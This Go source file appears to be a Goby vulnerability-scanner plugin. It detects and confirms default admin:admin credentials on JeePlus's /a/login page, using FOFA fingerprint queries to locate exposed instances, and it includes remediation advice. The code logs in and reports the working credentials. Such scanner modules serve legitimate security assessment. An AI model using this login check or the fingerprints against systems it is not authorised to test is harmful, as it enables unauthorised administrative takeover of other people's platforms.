package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Jeeplus /a/login Default Password Vulnerability",
    "Description": "<p>JeePlus is a software rapid development platform that uses a variety of modern Web technologies, including Spring Cloud/Spring Boot, MyBatis Plus, Spring Security, Redis, Vue3, Element Plus, and more. The platform supports a variety of databases, such as MySQL, Oracle, sqlserver, postgresql, etc. JeePlus adopts the standard SOA architecture and relies on the excellent foreground rich client framework to realize the MVC (Model View Controller) layer of the presentation layer. </p><p>Unauthorized attackers can take control of the entire platform through the default password vulnerability, and use administrator rights to operate core functions, thus causing harm to the system.</p>",
    "Product": "Jeeplus-Rapid-Dev-Platform",
    "Homepage": "http://www.jeeplus.org/",
    "DisclosureDate": "2021-08-19",
    "PostTime": "2024-08-08",
    "Author": "hhh3156",
    "FofaQuery": "body=\"/static/common/jeeplus.js\" || body=\"如果在框架或在对话框中，则弹出提示并跳转到首页\" && body=\"/static/common/jeeplus.css\" && body=\"/a/login\"",
    "GobyQuery": "body=\"/static/common/jeeplus.js\" || body=\"如果在框架或在对话框中，则弹出提示并跳转到首页\" && body=\"/static/common/jeeplus.css\" && body=\"/a/login\"",
    "Level": "2",
    "Impact": "<p>Unauthorized attackers can take control of the entire platform through the default password vulnerability, and use administrator rights to operate core functions, thus causing harm to the system.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercaseletters, numbers, and special characters, with more than 8 digits. </p><p>2. If not necessary, prohibit public network access to the system. </p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Info",
            "type": "select",
            "value": "Info",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/a/login",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
                    "Upgrade-Insecure-Requests": "1",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Cache-Control": "max-age=0",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6"
                },
                "data_type": "text",
                "data": "username=admin&password=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "错误",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "error",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "登录",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "记住我",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password",
        "2H1W"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "Jeeplus /a/login 默认口令漏洞",
            "Product": "JeePlus-快速开发平台",
            "Description": "<p>JeePlus是一个软件快速开发平台，使用多种现代Web技术，包括Spring Cloud/Spring Boot、MyBatis Plus、Spring Security、Redis、Vue3、Element Plus等。该平台支持多种数据库，如MySQL、Oracle、sqlserver、postgresql等。JeePlus采用标准的SOA架构，依托优秀的前台富客户端框架实现展示层的MVC（Model View Controller）再分层。<br></p><p>未授权的攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能，从而对系统造成危害。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。&nbsp;</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p>",
            "Impact": "<p>未授权的攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能，从而对系统造成危害。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Jeeplus /a/login Default Password Vulnerability",
            "Product": "Jeeplus-Rapid-Dev-Platform",
            "Description": "<p>JeePlus is a software rapid development platform that uses a variety of modern Web technologies, including Spring Cloud/Spring Boot, MyBatis Plus, Spring Security, Redis, Vue3, Element Plus, and more. The platform supports a variety of databases, such as MySQL, Oracle, sqlserver, postgresql, etc. JeePlus adopts the standard SOA architecture and relies on the excellent foreground rich client framework to realize the MVC (Model View Controller) layer of the presentation layer.&nbsp;</p><p>Unauthorized attackers can take control of the entire platform through the default password vulnerability, and use administrator rights to operate core functions, thus causing harm to the system.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercaseletters, numbers, and special characters, with more than 8 digits.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.&nbsp;</p><p>3. Set access policies and whitelist access through security devices such as firewalls.<br></p>",
            "Impact": "<p>Unauthorized attackers can take control of the entire platform through the default password vulnerability, and use administrator rights to operate core functions, thus causing harm to the system.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9933"
}`

	sendPayload_fpalviPALV25e69IAjvkamwuyv23 := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = true
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			PostRequest.Data = data
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Content-Type":    "application/x-www-form-urlencoded",
		}

		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
		// 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回
		vulInfo := `admin:admin`
		vulPath := `/a/login`

		data := `username=admin&password=admin`

		resp, err := setPostRequest(hostInfo, vulPath, data, header)
		if err != nil || resp.StatusCode != 200 || !strings.Contains(resp.RawBody, `/static/dataTables/dataTables.bootstrap.js`) {
			return false, "", ""
		}
		return true, vulInfo, vulPath
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, vulInfo, vulPath := sendPayload_fpalviPALV25e69IAjvkamwuyv23(hostInfo)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + "@" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, vulInfo, _ := sendPayload_fpalviPALV25e69IAjvkamwuyv23(expResult.HostInfo)
			expResult.Output = `Please use "` + vulInfo + `" to login`
			expResult.Success = true
			return expResult
		},
	))
}
